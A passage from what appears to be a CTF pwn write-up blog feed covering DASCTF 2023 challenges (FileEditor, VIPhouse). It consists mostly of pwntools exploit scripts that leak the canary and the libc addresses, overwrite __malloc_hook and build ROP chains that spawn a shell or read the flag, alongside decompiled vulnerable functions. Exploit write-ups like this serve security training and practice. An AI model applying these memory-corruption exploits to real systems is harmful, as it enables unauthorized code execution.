: gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401B7B&#x27;)#malloc</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401AFF&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, note</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Note: &#x27;</span>, note)</span><br><span class="line"><span class="comment">#mmap 0x7f82cbc1c010</span></span><br><span class="line">sla(<span class="string">b&#x27;do you want?&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x40040000</span>))</span><br><span class="line"><span class="comment">#pwndbg&gt; p &amp;main_arena.fastbinsY[5]</span></span><br><span class="line"><span class="comment">#$1 = (mfastbinptr *) 0x7f82cc009bb8 &lt;main_arena+56&gt;</span></span><br><span class="line"><span class="comment">#distance 0x7f82cc009bb8  0x7f82cbc1c010</span></span><br><span class="line"><span class="comment">#0x7f82cc009bb8-&gt;0x7f82cbc1c010 is -0x3edba8 bytes (-0x7db75 words)</span></span><br><span class="line">fast_5=<span class="number">0x3edba8</span>&gt;&gt;<span class="number">3</span></span><br><span class="line">add(fast_5,flat(<span class="number">0</span>,<span class="number">0x71</span>,<span class="number">0x404260</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,flat(<span class="number">0</span>,<span class="number">0</span>,elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">rl()</span><br><span class="line">puts_ad=uu64(r(<span class="number">6</span>))</span><br><span class="line">libcbase=puts_ad-libcelf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line"></span><br><span class="line">environ = libcbase + libcelf.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">malloc_hook=libcbase+libcelf.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">syscall=libcbase+libcelf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">write=libcbase+libcelf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read=libcbase+libcelf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">add(fast_5,flat(<span class="number">0</span>,<span class="number">0x71</span>,<span class="number">0x404260</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,flat(<span class="number">0</span>,<span class="number">0</span>,environ))</span><br><span class="line">rl()</span><br><span class="line">stack=uu64(r(<span class="number">6</span>))-<span class="number">0x98</span></span><br><span class="line">p(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line">pop_pop=<span class="number">0x0000000000401dbb</span></span><br><span class="line">ropstart=libcbase+<span class="number">0x00000000000ddc57</span></span><br><span class="line"><span class="comment"># 0x00000000000ddc57 : add rsp, 0xe0 ; pop rbx ; ret </span></span><br><span class="line">bss=<span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">add(fast_5,flat(<span class="number">0</span>,<span class="number">0x71</span>,stack-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401dc3</span></span><br><span class="line">pop_rsi_ret = libcbase + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_ret = libcbase + <span class="number">0x0000000000142c92</span></span><br><span class="line">ropread=flat(<span class="number">0</span>,<span class="number">0</span>,pop_rdi_ret,<span class="number">0</span>,pop_rsi_ret,bss+<span class="number">0x100</span>,pop_rdx_ret,<span class="number">0x300</span>,elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop.migrate(bss+<span class="number">0x100</span>)</span><br><span class="line">ropread+=rop.chain()</span><br><span class="line">add(<span class="number">1</span>,ropread)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x401B7B&#x27;)#malloc</span></span><br><span class="line">add(fast_5,flat(<span class="number">0</span>,<span class="number">0x71</span>,malloc_hook-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,p64(ropstart))</span><br><span class="line">db(<span class="string">&#x27;b *__malloc_hook&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">flagstr=bss+<span class="number">0x100</span>+<span class="number">7</span>*<span class="number">8</span>*<span class="number">3</span></span><br><span class="line">orw=flat(pop_rdi_ret,<span class="number">2</span>,pop_rsi_ret,flagstr,pop_rdx_ret,<span class="number">0</span>,syscall)</span><br><span class="line">orw+=flat(pop_rdi_ret,<span class="number">3</span>,pop_rsi_ret,bss+<span class="number">200</span>,pop_rdx_ret,<span class="number">0x30</span>,read)</span><br><span class="line">orw+=flat(pop_rdi_ret,<span class="number">1</span>,pop_rsi_ret,bss+<span class="number">200</span>,pop_rdx_ret,<span class="number">0x30</span>,write)</span><br><span class="line">orw.ljust(<span class="number">7</span>*<span class="number">8</span>*<span class="number">3</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">orw+=<span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">sl(orw)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 2023 &amp; 0X401 pwn</title>
      <link href="/2023/07/24/2023-DASCTF-0X401/"/>
      <url>/2023/07/24/2023-DASCTF-0X401/</url>
      
        <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/15LFJ4XykHz3bax3CAnJl3A">https://pan.baidu.com/s/15LFJ4XykHz3bax3CAnJl3A</a><br>hwg0</p><h2 id="FileEditor"><a href="#FileEditor" class="headerlink" title="FileEditor"></a>FileEditor</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">DWORD line_num</span><br><span class="line"><span class="type">char</span> <span class="built_in">string</span>[<span class="number">204</span>]</span><br><span class="line"><span class="type">void</span> *next_ptr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Find_Stringa2 + 1040a20canary\x00</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">vuln_copy</span><span class="params">(<span class="type">char</span> *a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(a2 + <span class="number">104</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcpy</span>(a1, (<span class="type">const</span> <span class="type">char</span> *)a2);</span><br><span class="line">  result = (<span class="type">char</span> *)*(<span class="type">unsigned</span> __int8 *)(a2 + <span class="number">105</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcpy</span>(a1, (<span class="type">const</span> <span class="type">char</span> *)a2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">179</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">char</span> *)*(<span class="type">unsigned</span> __int8 *)(i + a2);</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">0xFF</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    result = (<span class="type">char</span> *)*(<span class="type">unsigned</span> __int8 *)(i + a2);</span><br><span class="line">    a1[i] = (<span class="type">char</span>)result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Find_String</p><p><img src="/2023/07/24/2023-DASCTF-0X401/image-20230724230450343.png" alt="image-20230724230450343"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;28327&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Insert_Line</span>(<span class="params">line_num,line_count,content</span>):</span><br><span class="line">  sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;r n m:&#x27;</span>,<span class="built_in">str</span>(line_num).encode())</span><br><span class="line">  sl(<span class="built_in">str</span>(line_count).encode())</span><br><span class="line">  sla(<span class="string">b&#x27;sequence:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Modify_Line</span>(<span class="params">line_num,content</span>):</span><br><span class="line">  sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;be modified:&#x27;</span>,<span class="built_in">str</span>(line_num).encode())</span><br><span class="line">  sla(<span class="string">b&#x27; content:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findstring</span>(<span class="params">find_str</span>):</span><br><span class="line">  sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;search for:&#x27;</span>,find_str)</span><br><span class="line">  sla(<span class="string">b&#x27;hing? (y/n)&#x27;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">  sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x2154)&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x001FA4)&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x02350)&#x27;)</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt; choose:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">Insert_Line(<span class="number">1</span>,<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>)</span><br><span class="line">findstring(<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>)</span><br><span class="line">canary=uu64(r(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line">p(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">pie=uu64(r(<span class="number">6</span>))-(<span class="number">0x55555555552b</span>-<span class="number">0x555555554000</span>)</span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line"></span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heapbase=uu64(r(<span class="number">6</span>))-(<span class="number">0x55555555a2a0</span>-<span class="number">0x55555555a000</span>)</span><br><span class="line">p(<span class="string">&#x27;heapbase&#x27;</span>,heapbase)</span><br><span class="line"></span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;A&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libcbase=uu64(r(<span class="number">6</span>))-(<span class="number">0x7ffff7de5083</span>-<span class="number">0x7ffff7dc1000</span>)<span class="comment">#ubuntu20</span></span><br><span class="line"><span class="comment"># -(0x7ffff7c29d90-0x7ffff7c00000)#unbuntu22</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))+libcbase</span><br><span class="line">rdi=pie+<span class="number">0x2ac3</span></span><br><span class="line">ret=pie+<span class="number">0x101a</span></span><br><span class="line">rop=flat([canary,<span class="number">0</span>,rdi,binsh,ret,system])</span><br><span class="line"><span class="built_in">print</span>(rop)</span><br><span class="line"><span class="comment"># rop=p64(canary)+p64(0xdeadbeef)+p64(rdi)+p64(binsh)+p64(system)</span></span><br><span class="line"><span class="comment"># print(rop)</span></span><br><span class="line">Modify_Line(<span class="number">1</span>,<span class="string">b&#x27;abc&#x27;</span>+<span class="string">b&#x27;d&#x27;</span>*<span class="number">101</span>+rop)</span><br><span class="line">findstring(<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>Replace_String</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> v14[<span class="number">104</span>]; <span class="comment">// [rsp+130h] [rbp-70h] BYREF</span></span><br><span class="line"><span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp+198h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">v4 = <span class="number">0</span>;</span><br><span class="line">v5 = <span class="number">1</span>;</span><br><span class="line">v7 = <span class="number">1</span>;</span><br><span class="line">v9 = a1;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&gt; Please enter the string to search for:&quot;</span>);</span><br><span class="line">read_string((__int64)s2, <span class="number">104</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&gt; Replace with:&quot;</span>);</span><br><span class="line">read_string((__int64)v14, <span class="number">104</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">read_string</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="type">int</span>)i &lt;= a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = read(<span class="number">0</span>, (<span class="type">void</span> *)((<span class="type">int</span>)i + a1), <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)((<span class="type">int</span>)i + a1) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)((<span class="type">int</span>)i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read_string105canary</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v11 = sub_55EAC947338F(s2, v14, v9-&gt;<span class="built_in">string</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(v9-&gt;<span class="built_in">string</span>, v11);</span><br></pre></td></tr></table></figure><p>canary</p><p>read_string&#x2F;ncanary</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&gt; Do you want to change your strings? (y/n)&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%c&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v3 == <span class="string">&#x27;Y&#x27;</span> || v3 == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&gt; Replace with:&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    read_string((__int64)v14, <span class="number">104</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>canaryFind_Stringropputslibclibc_start_call_mainlibc</p><h2 id="VIPhouse"><a href="#VIPhouse" class="headerlink" title="VIPhouse"></a>VIPhouse</h2><p>login</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">login</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [rsp+0h] [rbp-2A0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+64h] [rbp-23Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">64</span>]; <span class="comment">// [rsp+258h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+298h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v2, <span class="number">0</span>, <span class="number">0x1F4</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your username: &quot;</span>);</span><br><span class="line">  get_str(s, <span class="number">99LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your password: &quot;</span>);</span><br><span class="line">  get_str(v3, <span class="number">104LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, <span class="string">&quot;admin&quot;</span>) &amp;&amp; !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;root&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome, ADMIN~&quot;</span>);</span><br><span class="line">    admin = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  user = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>canary function strcpy(s, random);srandom0sb\x00*8canary</p><p>gadgetrdi</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Add_Note</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please delete at first!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    ptr = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to allocate memory.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your note: &quot;</span>);</span><br><span class="line">    get_str((__int64)ptr, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( ptr )</span><br><span class="line">      <span class="built_in">strcpy</span>(dest, ptr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note added.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Add_Notedest</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401CB2 55                            push    rbp</span><br><span class="line">.text:0000000000401CB3 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000401CB6 48 8D 05 73 24 00 00          lea     rax, dest;destrax</span><br><span class="line">.text:0000000000401CBD 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:0000000000401CC0 48 8B 3F                      mov     rdi, [rdi];destaddnoterdi</span><br><span class="line">.text:0000000000401CC3 C3                            retn</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./viphouse&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># io = process(pwnfile)</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">a</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Choose an option: &#x27;</span>,<span class="built_in">str</span>(a).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title 